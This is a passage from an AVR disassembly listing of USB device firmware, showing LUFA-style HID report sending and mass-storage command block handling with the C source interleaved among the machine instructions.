		if (ReportINSize && (ForceSend || StatesChanged || IdlePeriodElapsed))
    61f6:	89 81       	ldd	r24, Y+1	; 0x01
    61f8:	9a 81       	ldd	r25, Y+2	; 0x02
    61fa:	89 2b       	or	r24, r25
    61fc:	f1 f0       	breq	.+60     	; 0x623a <HID_Device_USBTask+0x13e>
    61fe:	61 10       	cpse	r6, r1
    6200:	04 c0       	rjmp	.+8      	; 0x620a <HID_Device_USBTask+0x10e>
    6202:	51 10       	cpse	r5, r1
    6204:	02 c0       	rjmp	.+4      	; 0x620a <HID_Device_USBTask+0x10e>
    6206:	77 20       	and	r7, r7
    6208:	c1 f0       	breq	.+48     	; 0x623a <HID_Device_USBTask+0x13e>
		{
			HIDInterfaceInfo->State.IdleMSRemaining = HIDInterfaceInfo->State.IdleCount;
    620a:	f7 01       	movw	r30, r14
    620c:	84 85       	ldd	r24, Z+12	; 0x0c
    620e:	95 85       	ldd	r25, Z+13	; 0x0d
    6210:	97 87       	std	Z+15, r25	; 0x0f
    6212:	86 87       	std	Z+14, r24	; 0x0e

			Endpoint_SelectEndpoint(HIDInterfaceInfo->Config.ReportINEndpoint.Address);
    6214:	81 81       	ldd	r24, Z+1	; 0x01
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6216:	8f 70       	andi	r24, 0x0F	; 15
    6218:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>

			if (ReportID)
    621c:	8b 81       	ldd	r24, Y+3	; 0x03
    621e:	81 11       	cpse	r24, r1
			 *  \param[in] Data  Data to write into the the currently selected endpoint's FIFO buffer.
			 */
			static inline void Endpoint_Write_8(const uint8_t Data) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_Write_8(const uint8_t Data)
			{
				UEDATX = Data;
    6220:	80 93 f1 00 	sts	0x00F1, r24	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
			  Endpoint_Write_8(ReportID);

			Endpoint_Write_Stream_LE(ReportINData, ReportINSize, NULL);
    6224:	69 81       	ldd	r22, Y+1	; 0x01
    6226:	7a 81       	ldd	r23, Y+2	; 0x02
    6228:	40 e0       	ldi	r20, 0x00	; 0
    622a:	50 e0       	ldi	r21, 0x00	; 0
    622c:	c6 01       	movw	r24, r12
    622e:	eb d1       	rcall	.+982    	; 0x6606 <Endpoint_Write_Stream_LE>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    6230:	e8 ee       	ldi	r30, 0xE8	; 232
    6232:	f0 e0       	ldi	r31, 0x00	; 0
    6234:	80 81       	ld	r24, Z
    6236:	8e 77       	andi	r24, 0x7E	; 126
    6238:	80 83       	st	Z, r24
    623a:	80 91 e4 00 	lds	r24, 0x00E4	; 0x8000e4 <__TEXT_REGION_LENGTH__+0x7e00e4>
    623e:	90 91 e5 00 	lds	r25, 0x00E5	; 0x8000e5 <__TEXT_REGION_LENGTH__+0x7e00e5>

			Endpoint_ClearIN();
		}

		HIDInterfaceInfo->State.PrevFrameNum = USB_Device_GetFrameNumber();
    6242:	f7 01       	movw	r30, r14
    6244:	93 87       	std	Z+11, r25	; 0x0b
    6246:	82 87       	std	Z+10, r24	; 0x0a
    6248:	0f b6       	in	r0, 0x3f	; 63
    624a:	f8 94       	cli
    624c:	9e be       	out	0x3e, r9	; 62
    624e:	0f be       	out	0x3f, r0	; 63
    6250:	8d be       	out	0x3d, r8	; 61
	}
}
    6252:	0f b6       	in	r0, 0x3f	; 63
    6254:	f8 94       	cli
    6256:	be be       	out	0x3e, r11	; 62
    6258:	0f be       	out	0x3f, r0	; 63
    625a:	ad be       	out	0x3d, r10	; 61
    625c:	0f 90       	pop	r0
    625e:	0f 90       	pop	r0
    6260:	0f 90       	pop	r0
    6262:	df 91       	pop	r29
    6264:	cf 91       	pop	r28
    6266:	1f 91       	pop	r17
    6268:	0f 91       	pop	r16
    626a:	ff 90       	pop	r15
    626c:	ef 90       	pop	r14
    626e:	df 90       	pop	r13
    6270:	cf 90       	pop	r12
    6272:	bf 90       	pop	r11
    6274:	af 90       	pop	r10
    6276:	9f 90       	pop	r9
    6278:	8f 90       	pop	r8
    627a:	7f 90       	pop	r7
    627c:	6f 90       	pop	r6
    627e:	5f 90       	pop	r5
    6280:	08 95       	ret

00006282 <MS_Device_ReadInCommandBlock>:
		MSInterfaceInfo->State.IsMassStoreReset = false;
	}
}

static bool MS_Device_ReadInCommandBlock(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
    6282:	0f 93       	push	r16
    6284:	1f 93       	push	r17
    6286:	cf 93       	push	r28
    6288:	df 93       	push	r29
    628a:	00 d0       	rcall	.+0      	; 0x628c <MS_Device_ReadInCommandBlock+0xa>
    628c:	cd b7       	in	r28, 0x3d	; 61
    628e:	de b7       	in	r29, 0x3e	; 62
    6290:	8c 01       	movw	r16, r24
	uint16_t BytesProcessed;

	Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataOUTEndpoint.Address);
    6292:	dc 01       	movw	r26, r24
    6294:	16 96       	adiw	r26, 0x06	; 6
    6296:	8c 91       	ld	r24, X
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6298:	8f 70       	andi	r24, 0x0F	; 15
    629a:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>

	BytesProcessed = 0;
    629e:	1a 82       	std	Y+2, r1	; 0x02
    62a0:	19 82       	std	Y+1, r1	; 0x01
	while (Endpoint_Read_Stream_LE(&MSInterfaceInfo->State.CommandBlock,
    62a2:	04 c0       	rjmp	.+8      	; 0x62ac <MS_Device_ReadInCommandBlock+0x2a>
	                               (sizeof(MS_CommandBlockWrapper_t) - 16), &BytesProcessed) ==
	                               ENDPOINT_RWSTREAM_IncompleteTransfer)
	{
		if (MSInterfaceInfo->State.IsMassStoreReset)
    62a4:	f8 01       	movw	r30, r16
    62a6:	80 ad       	ldd	r24, Z+56	; 0x38
    62a8:	81 11       	cpse	r24, r1
    62aa:	52 c0       	rjmp	.+164    	; 0x6350 <MS_Device_ReadInCommandBlock+0xce>
	uint16_t BytesProcessed;

	Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataOUTEndpoint.Address);

	BytesProcessed = 0;
	while (Endpoint_Read_Stream_LE(&MSInterfaceInfo->State.CommandBlock,
    62ac:	ae 01       	movw	r20, r28
    62ae:	4f 5f       	subi	r20, 0xFF	; 255
    62b0:	5f 4f       	sbci	r21, 0xFF	; 255
    62b2:	6f e0       	ldi	r22, 0x0F	; 15
    62b4:	70 e0       	ldi	r23, 0x00	; 0
    62b6:	c8 01       	movw	r24, r16
    62b8:	0c 96       	adiw	r24, 0x0c	; 12
    62ba:	3d d2       	rcall	.+1146   	; 0x6736 <Endpoint_Read_Stream_LE>
    62bc:	85 30       	cpi	r24, 0x05	; 5
    62be:	91 f3       	breq	.-28     	; 0x62a4 <MS_Device_ReadInCommandBlock+0x22>
	{
		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return false;
	}

	if ((MSInterfaceInfo->State.CommandBlock.Signature         != CPU_TO_LE32(MS_CBW_SIGNATURE))     ||
    62c0:	f8 01       	movw	r30, r16
    62c2:	84 85       	ldd	r24, Z+12	; 0x0c
    62c4:	95 85       	ldd	r25, Z+13	; 0x0d
    62c6:	a6 85       	ldd	r26, Z+14	; 0x0e
    62c8:	b7 85       	ldd	r27, Z+15	; 0x0f
    62ca:	85 35       	cpi	r24, 0x55	; 85
    62cc:	93 45       	sbci	r25, 0x53	; 83
    62ce:	a2 44       	sbci	r26, 0x42	; 66
    62d0:	b3 44       	sbci	r27, 0x43	; 67
    62d2:	a1 f4       	brne	.+40     	; 0x62fc <MS_Device_ReadInCommandBlock+0x7a>
	    (MSInterfaceInfo->State.CommandBlock.LUN               >= MSInterfaceInfo->Config.TotalLUNs) ||
    62d4:	d8 01       	movw	r26, r16
    62d6:	59 96       	adiw	r26, 0x19	; 25
    62d8:	9c 91       	ld	r25, X
    62da:	59 97       	sbiw	r26, 0x19	; 25
    62dc:	1b 96       	adiw	r26, 0x0b	; 11
    62de:	8c 91       	ld	r24, X
    62e0:	1b 97       	sbiw	r26, 0x0b	; 11
	{
		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return false;
	}

	if ((MSInterfaceInfo->State.CommandBlock.Signature         != CPU_TO_LE32(MS_CBW_SIGNATURE))     ||
    62e2:	98 17       	cp	r25, r24
    62e4:	58 f4       	brcc	.+22     	; 0x62fc <MS_Device_ReadInCommandBlock+0x7a>
	    (MSInterfaceInfo->State.CommandBlock.LUN               >= MSInterfaceInfo->Config.TotalLUNs) ||
		(MSInterfaceInfo->State.CommandBlock.Flags              & 0x1F)                              ||
    62e6:	58 96       	adiw	r26, 0x18	; 24
    62e8:	8c 91       	ld	r24, X
    62ea:	58 97       	sbiw	r26, 0x18	; 24
		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return false;
	}

	if ((MSInterfaceInfo->State.CommandBlock.Signature         != CPU_TO_LE32(MS_CBW_SIGNATURE))     ||
	    (MSInterfaceInfo->State.CommandBlock.LUN               >= MSInterfaceInfo->Config.TotalLUNs) ||
    62ec:	8f 71       	andi	r24, 0x1F	; 31
    62ee:	31 f4       	brne	.+12     	; 0x62fc <MS_Device_ReadInCommandBlock+0x7a>
		(MSInterfaceInfo->State.CommandBlock.Flags              & 0x1F)                              ||
		(MSInterfaceInfo->State.CommandBlock.SCSICommandLength == 0)                                 ||
    62f0:	5a 96       	adiw	r26, 0x1a	; 26
    62f2:	8c 91       	ld	r24, X
		  return false;
	}

	if ((MSInterfaceInfo->State.CommandBlock.Signature         != CPU_TO_LE32(MS_CBW_SIGNATURE))     ||
	    (MSInterfaceInfo->State.CommandBlock.LUN               >= MSInterfaceInfo->Config.TotalLUNs) ||
		(MSInterfaceInfo->State.CommandBlock.Flags              & 0x1F)                              ||
    62f4:	88 23       	and	r24, r24
    62f6:	11 f0       	breq	.+4      	; 0x62fc <MS_Device_ReadInCommandBlock+0x7a>
		(MSInterfaceInfo->State.CommandBlock.SCSICommandLength == 0)                                 ||
    62f8:	81 31       	cpi	r24, 0x11	; 17
    62fa:	80 f0       	brcs	.+32     	; 0x631c <MS_Device_ReadInCommandBlock+0x9a>
			 *  \ingroup Group_EndpointPacketManagement_AVR8
			 */
			static inline void Endpoint_StallTransaction(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_StallTransaction(void)
			{
				UECONX |= (1 << STALLRQ);
    62fc:	eb ee       	ldi	r30, 0xEB	; 235
    62fe:	f0 e0       	ldi	r31, 0x00	; 0
    6300:	80 81       	ld	r24, Z
    6302:	80 62       	ori	r24, 0x20	; 32
    6304:	80 83       	st	Z, r24
		(MSInterfaceInfo->State.CommandBlock.SCSICommandLength >  16))
	{
		Endpoint_StallTransaction();
		Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataINEndpoint.Address);
    6306:	d8 01       	movw	r26, r16
    6308:	11 96       	adiw	r26, 0x01	; 1
    630a:	8c 91       	ld	r24, X
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    630c:	8f 70       	andi	r24, 0x0F	; 15
    630e:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
			 *  \ingroup Group_EndpointPacketManagement_AVR8
			 */
			static inline void Endpoint_StallTransaction(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_StallTransaction(void)
			{
				UECONX |= (1 << STALLRQ);
    6312:	80 81       	ld	r24, Z
    6314:	80 62       	ori	r24, 0x20	; 32
    6316:	80 83       	st	Z, r24
		Endpoint_StallTransaction();

		return false;
    6318:	80 e0       	ldi	r24, 0x00	; 0
    631a:	1d c0       	rjmp	.+58     	; 0x6356 <MS_Device_ReadInCommandBlock+0xd4>
	}

	BytesProcessed = 0;
    631c:	1a 82       	std	Y+2, r1	; 0x02
    631e:	19 82       	std	Y+1, r1	; 0x01
	while (Endpoint_Read_Stream_LE(&MSInterfaceInfo->State.CommandBlock.SCSICommandData,
    6320:	04 c0       	rjmp	.+8      	; 0x632a <MS_Device_ReadInCommandBlock+0xa8>
	                                MSInterfaceInfo->State.CommandBlock.SCSICommandLength, &BytesProcessed) ==
	                                ENDPOINT_RWSTREAM_IncompleteTransfer)
	{
		if (MSInterfaceInfo->State.IsMassStoreReset)
    6322:	f8 01       	movw	r30, r16
    6324:	80 ad       	ldd	r24, Z+56	; 0x38
    6326:	81 11       	cpse	r24, r1
    6328:	15 c0       	rjmp	.+42     	; 0x6354 <MS_Device_ReadInCommandBlock+0xd2>
		return false;
	}

	BytesProcessed = 0;
	while (Endpoint_Read_Stream_LE(&MSInterfaceInfo->State.CommandBlock.SCSICommandData,
	                                MSInterfaceInfo->State.CommandBlock.SCSICommandLength, &BytesProcessed) ==
    632a:	d8 01       	movw	r26, r16
    632c:	5a 96       	adiw	r26, 0x1a	; 26
    632e:	6c 91       	ld	r22, X

		return false;
	}

	BytesProcessed = 0;
	while (Endpoint_Read_Stream_LE(&MSInterfaceInfo->State.CommandBlock.SCSICommandData,
    6330:	70 e0       	ldi	r23, 0x00	; 0
    6332:	ae 01       	movw	r20, r28
    6334:	4f 5f       	subi	r20, 0xFF	; 255
    6336:	5f 4f       	sbci	r21, 0xFF	; 255
    6338:	c8 01       	movw	r24, r16
    633a:	4b 96       	adiw	r24, 0x1b	; 27
    633c:	fc d1       	rcall	.+1016   	; 0x6736 <Endpoint_Read_Stream_LE>
    633e:	85 30       	cpi	r24, 0x05	; 5
    6340:	81 f3       	breq	.-32     	; 0x6322 <MS_Device_ReadInCommandBlock+0xa0>
			 */
			static inline void Endpoint_ClearOUT(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearOUT(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << RXOUTI) | (1 << FIFOCON));
    6342:	e8 ee       	ldi	r30, 0xE8	; 232
    6344:	f0 e0       	ldi	r31, 0x00	; 0
    6346:	80 81       	ld	r24, Z
    6348:	8b 77       	andi	r24, 0x7B	; 123
    634a:	80 83       	st	Z, r24
		  return false;
	}

	Endpoint_ClearOUT();

	return true;
    634c:	81 e0       	ldi	r24, 0x01	; 1
    634e:	03 c0       	rjmp	.+6      	; 0x6356 <MS_Device_ReadInCommandBlock+0xd4>
	while (Endpoint_Read_Stream_LE(&MSInterfaceInfo->State.CommandBlock,
	                               (sizeof(MS_CommandBlockWrapper_t) - 16), &BytesProcessed) ==
	                               ENDPOINT_RWSTREAM_IncompleteTransfer)
	{
		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return false;
    6350:	80 e0       	ldi	r24, 0x00	; 0
    6352:	01 c0       	rjmp	.+2      	; 0x6356 <MS_Device_ReadInCommandBlock+0xd4>
	while (Endpoint_Read_Stream_LE(&MSInterfaceInfo->State.CommandBlock.SCSICommandData,
	                                MSInterfaceInfo->State.CommandBlock.SCSICommandLength, &BytesProcessed) ==
	                                ENDPOINT_RWSTREAM_IncompleteTransfer)
	{
		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return false;
    6354:	80 e0       	ldi	r24, 0x00	; 0
	}

	Endpoint_ClearOUT();

	return true;
}
    6356:	0f 90       	pop	r0
    6358:	0f 90       	pop	r0
    635a:	df 91       	pop	r29
    635c:	cf 91       	pop	r28
    635e:	1f 91       	pop	r17
    6360:	0f 91       	pop	r16
    6362:	08 95       	ret

00006364 <MS_Device_ReturnCommandStatus>:

static void MS_Device_ReturnCommandStatus(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
    6364:	0f 93       	push	r16
    6366:	1f 93       	push	r17
    6368:	cf 93       	push	r28
    636a:	df 93       	push	r29
    636c:	00 d0       	rcall	.+0      	; 0x636e <MS_Device_ReturnCommandStatus+0xa>
    636e:	cd b7       	in	r28, 0x3d	; 61
    6370:	de b7       	in	r29, 0x3e	; 62
    6372:	fc 01       	movw	r30, r24
	Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataOUTEndpoint.Address);
    6374:	86 81       	ldd	r24, Z+6	; 0x06
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    6376:	8f 70       	andi	r24, 0x0F	; 15
    6378:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
    637c:	03 c0       	rjmp	.+6      	; 0x6384 <MS_Device_ReturnCommandStatus+0x20>
	{
		#if !defined(INTERRUPT_CONTROL_ENDPOINT)
		USB_USBTask();
		#endif

		if (MSInterfaceInfo->State.IsMassStoreReset)
    637e:	80 ad       	ldd	r24, Z+56	; 0x38
    6380:	81 11       	cpse	r24, r1
    6382:	27 c0       	rjmp	.+78     	; 0x63d2 <MS_Device_ReturnCommandStatus+0x6e>
			 *  \return Boolean \c true if the currently selected endpoint is stalled, \c false otherwise.
			 */
			static inline bool Endpoint_IsStalled(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsStalled(void)
			{
				return ((UECONX & (1 << STALLRQ)) ? true : false);
    6384:	80 91 eb 00 	lds	r24, 0x00EB	; 0x8000eb <__TEXT_REGION_LENGTH__+0x7e00eb>

static void MS_Device_ReturnCommandStatus(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
	Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataOUTEndpoint.Address);

	while (Endpoint_IsStalled())
    6388:	85 fd       	sbrc	r24, 5
    638a:	f9 cf       	rjmp	.-14     	; 0x637e <MS_Device_ReturnCommandStatus+0x1a>

		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return;
	}

	Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataINEndpoint.Address);
    638c:	81 81       	ldd	r24, Z+1	; 0x01
			 */
			static inline void Endpoint_SelectEndpoint(const uint8_t Address) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_SelectEndpoint(const uint8_t Address)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UENUM = (Address & ENDPOINT_EPNUM_MASK);
    638e:	8f 70       	andi	r24, 0x0F	; 15
    6390:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
    6394:	03 c0       	rjmp	.+6      	; 0x639c <MS_Device_ReturnCommandStatus+0x38>
	{
		#if !defined(INTERRUPT_CONTROL_ENDPOINT)
		USB_USBTask();
		#endif

		if (MSInterfaceInfo->State.IsMassStoreReset)
    6396:	80 ad       	ldd	r24, Z+56	; 0x38
    6398:	81 11       	cpse	r24, r1
    639a:	1b c0       	rjmp	.+54     	; 0x63d2 <MS_Device_ReturnCommandStatus+0x6e>
			 *  \return Boolean \c true if the currently selected endpoint is stalled, \c false otherwise.
			 */
			static inline bool Endpoint_IsStalled(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsStalled(void)
			{
				return ((UECONX & (1 << STALLRQ)) ? true : false);
    639c:	80 91 eb 00 	lds	r24, 0x00EB	; 0x8000eb <__TEXT_REGION_LENGTH__+0x7e00eb>
		  return;
	}

	Endpoint_SelectEndpoint(MSInterfaceInfo->Config.DataINEndpoint.Address);

	while (Endpoint_IsStalled())
    63a0:	85 fd       	sbrc	r24, 5
    63a2:	f9 cf       	rjmp	.-14     	; 0x6396 <MS_Device_ReturnCommandStatus+0x32>
    63a4:	8f 01       	movw	r16, r30

		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return;
	}

	uint16_t BytesProcessed = 0;
    63a6:	1a 82       	std	Y+2, r1	; 0x02
    63a8:	19 82       	std	Y+1, r1	; 0x01
	while (Endpoint_Write_Stream_LE(&MSInterfaceInfo->State.CommandStatus,
    63aa:	04 c0       	rjmp	.+8      	; 0x63b4 <MS_Device_ReturnCommandStatus+0x50>
	                                sizeof(MS_CommandStatusWrapper_t), &BytesProcessed) ==
	                                ENDPOINT_RWSTREAM_IncompleteTransfer)
	{
		if (MSInterfaceInfo->State.IsMassStoreReset)
    63ac:	f8 01       	movw	r30, r16
    63ae:	80 ad       	ldd	r24, Z+56	; 0x38
    63b0:	81 11       	cpse	r24, r1
    63b2:	0f c0       	rjmp	.+30     	; 0x63d2 <MS_Device_ReturnCommandStatus+0x6e>
		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return;
	}

	uint16_t BytesProcessed = 0;
	while (Endpoint_Write_Stream_LE(&MSInterfaceInfo->State.CommandStatus,
    63b4:	ae 01       	movw	r20, r28
    63b6:	4f 5f       	subi	r20, 0xFF	; 255
    63b8:	5f 4f       	sbci	r21, 0xFF	; 255
    63ba:	6d e0       	ldi	r22, 0x0D	; 13
    63bc:	70 e0       	ldi	r23, 0x00	; 0
    63be:	c8 01       	movw	r24, r16
    63c0:	8b 96       	adiw	r24, 0x2b	; 43
    63c2:	21 d1       	rcall	.+578    	; 0x6606 <Endpoint_Write_Stream_LE>
    63c4:	85 30       	cpi	r24, 0x05	; 5
    63c6:	91 f3       	breq	.-28     	; 0x63ac <MS_Device_ReturnCommandStatus+0x48>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    63c8:	e8 ee       	ldi	r30, 0xE8	; 232
    63ca:	f0 e0       	ldi	r31, 0x00	; 0
    63cc:	80 81       	ld	r24, Z
    63ce:	8e 77       	andi	r24, 0x7E	; 126
    63d0:	80 83       	st	Z, r24
		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return;
	}

	Endpoint_ClearIN();
}
    63d2:	0f 90       	pop	r0
    63d4:	0f 90       	pop	r0
    63d6:	df 91       	pop	r29
    63d8:	cf 91       	pop	r28
    63da:	1f 91       	pop	r17
    63dc:	0f 91       	pop	r16
    63de:	08 95       	ret

000063e0 <MS_Device_ProcessControlRequest>:
#define  __INCLUDE_FROM_MS_DRIVER
#define  __INCLUDE_FROM_MASSSTORAGE_DEVICE_C
#include "MassStorageClassDevice.h"

void MS_Device_ProcessControlRequest(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
    63e0:	cf 93       	push	r28
    63e2:	df 93       	push	r29
    63e4:	fc 01       	movw	r30, r24
			 *  \return Boolean \c true if the selected endpoint has received a SETUP packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsSETUPReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsSETUPReceived(void)
			{
				return ((UEINTX & (1 << RXSTPI)) ? true : false);
    63e6:	90 91 e8 00 	lds	r25, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
	if (!(Endpoint_IsSETUPReceived()))
    63ea:	93 ff       	sbrs	r25, 3
    63ec:	34 c0       	rjmp	.+104    	; 0x6456 <MS_Device_ProcessControlRequest+0x76>
	  return;

	if (USB_ControlRequest.wIndex != MSInterfaceInfo->Config.InterfaceNumber)
    63ee:	80 91 f8 0d 	lds	r24, 0x0DF8	; 0x800df8 <USB_ControlRequest+0x4>
    63f2:	90 91 f9 0d 	lds	r25, 0x0DF9	; 0x800df9 <USB_ControlRequest+0x5>
    63f6:	20 81       	ld	r18, Z
    63f8:	30 e0       	ldi	r19, 0x00	; 0
    63fa:	82 17       	cp	r24, r18
    63fc:	93 07       	cpc	r25, r19
    63fe:	59 f5       	brne	.+86     	; 0x6456 <MS_Device_ProcessControlRequest+0x76>
    6400:	ef 01       	movw	r28, r30
	  return;

	switch (USB_ControlRequest.bRequest)
    6402:	80 91 f5 0d 	lds	r24, 0x0DF5	; 0x800df5 <USB_ControlRequest+0x1>
    6406:	8e 3f       	cpi	r24, 0xFE	; 254
    6408:	79 f0       	breq	.+30     	; 0x6428 <MS_Device_ProcessControlRequest+0x48>
    640a:	8f 3f       	cpi	r24, 0xFF	; 255
    640c:	21 f5       	brne	.+72     	; 0x6456 <MS_Device_ProcessControlRequest+0x76>
	{
		case MS_REQ_MassStorageReset:
			if (USB_ControlRequest.bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_CLASS | REQREC_INTERFACE))
    640e:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    6412:	81 32       	cpi	r24, 0x21	; 33
    6414:	01 f5       	brne	.+64     	; 0x6456 <MS_Device_ProcessControlRequest+0x76>
			 *  \note This is not applicable for non CONTROL type endpoints.
			 */
			static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearSETUP(void)
			{
				UEINTX &= ~(1 << RXSTPI);
    6416:	e8 ee       	ldi	r30, 0xE8	; 232
    6418:	f0 e0       	ldi	r31, 0x00	; 0
    641a:	80 81       	ld	r24, Z
    641c:	87 7f       	andi	r24, 0xF7	; 247
    641e:	80 83       	st	Z, r24
			{
				Endpoint_ClearSETUP();
				Endpoint_ClearStatusStage();
    6420:	fc d2       	rcall	.+1528   	; 0x6a1a <Endpoint_ClearStatusStage>

				MSInterfaceInfo->State.IsMassStoreReset = true;
    6422:	81 e0       	ldi	r24, 0x01	; 1
    6424:	88 af       	std	Y+56, r24	; 0x38
    6426:	17 c0       	rjmp	.+46     	; 0x6456 <MS_Device_ProcessControlRequest+0x76>
			}

			break;
		case MS_REQ_GetMaxLUN:
			if (USB_ControlRequest.bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_CLASS | REQREC_INTERFACE))
    6428:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    642c:	81 3a       	cpi	r24, 0xA1	; 161
    642e:	99 f4       	brne	.+38     	; 0x6456 <MS_Device_ProcessControlRequest+0x76>
    6430:	e8 ee       	ldi	r30, 0xE8	; 232
    6432:	f0 e0       	ldi	r31, 0x00	; 0
    6434:	80 81       	ld	r24, Z
    6436:	87 7f       	andi	r24, 0xF7	; 247
    6438:	80 83       	st	Z, r24
			 *  \return Boolean \c true if the current endpoint is ready for an IN packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsINReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsINReady(void)
			{
				return ((UEINTX & (1 << TXINI)) ? true : false);
    643a:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
			{
				Endpoint_ClearSETUP();
				while (!(Endpoint_IsINReady()));
    643e:	80 ff       	sbrs	r24, 0
    6440:	fc cf       	rjmp	.-8      	; 0x643a <MS_Device_ProcessControlRequest+0x5a>
				Endpoint_Write_8(MSInterfaceInfo->Config.TotalLUNs - 1);
    6442:	8b 85       	ldd	r24, Y+11	; 0x0b
    6444:	81 50       	subi	r24, 0x01	; 1
			 *  \param[in] Data  Data to write into the the currently selected endpoint's FIFO buffer.
			 */
			static inline void Endpoint_Write_8(const uint8_t Data) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_Write_8(const uint8_t Data)
			{
				UEDATX = Data;
    6446:	80 93 f1 00 	sts	0x00F1, r24	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    644a:	e8 ee       	ldi	r30, 0xE8	; 232
    644c:	f0 e0       	ldi	r31, 0x00	; 0
    644e:	80 81       	ld	r24, Z
    6450:	8e 77       	andi	r24, 0x7E	; 126
				Endpoint_ClearIN();
				Endpoint_ClearStatusStage();
    6452:	80 83       	st	Z, r24
    6454:	e2 d2       	rcall	.+1476   	; 0x6a1a <Endpoint_ClearStatusStage>
			}

			break;
	}
}
    6456:	df 91       	pop	r29
    6458:	cf 91       	pop	r28
    645a:	08 95       	ret

0000645c <MS_Device_ConfigureEndpoints>:

bool MS_Device_ConfigureEndpoints(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
    645c:	cf 93       	push	r28
    645e:	df 93       	push	r29
    6460:	ec 01       	movw	r28, r24
	memset(&MSInterfaceInfo->State, 0x00, sizeof(MSInterfaceInfo->State));
    6462:	fc 01       	movw	r30, r24
    6464:	3c 96       	adiw	r30, 0x0c	; 12
    6466:	8d e2       	ldi	r24, 0x2D	; 45
    6468:	df 01       	movw	r26, r30
    646a:	1d 92       	st	X+, r1
    646c:	8a 95       	dec	r24
    646e:	e9 f7       	brne	.-6      	; 0x646a <MS_Device_ConfigureEndpoints+0xe>

